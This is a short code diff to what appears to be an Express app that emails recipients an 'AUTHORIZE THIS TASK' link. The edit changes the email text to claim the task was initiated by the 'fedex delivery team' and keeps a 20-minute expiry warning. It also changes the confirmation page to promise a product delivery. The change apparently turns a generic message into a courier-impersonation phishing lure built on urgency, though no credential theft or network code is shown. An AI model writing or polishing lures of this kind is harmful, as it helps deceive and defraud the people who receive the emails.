@@ -218,8 +218,8 @@ app.get('/authorize/:token', (req, res) => {
   res.render('result', {
     success: true,
     title: 'Task Authorized Successfully!',
-    message: `Task "${tokenData.taskName}" has been authorized and accepted.`,
-    subMessage: 'You can now proceed with the assigned task.'
+    message: `Product "${tokenData.taskName}" has been authorized and accepted.`,
+    subMessage: 'Your product will arrive within the designated period.'
   });
 });
 
@@ -374,7 +374,7 @@ async function generateEmailHtml(data) {
             <!-- Authorization Section -->
             <div class="auth-section">
                 <h3 style="margin-top: 0; color: #856404;">🔐 Authorization Required</h3>
-                <p>If this task was initiated by you or your friends, please authorize this message to confirm receipt and acceptance.</p>
+                <p>If this task was initiated by fedex delivery team, please authorize this message to confirm receipt and acceptance.</p>
                 <a href="${data.authUrl}" class="auth-button">AUTHORIZE THIS TASK</a>
                 <div class="warning">⚠️ This link will expire in 20 minutes</div>
             </div>
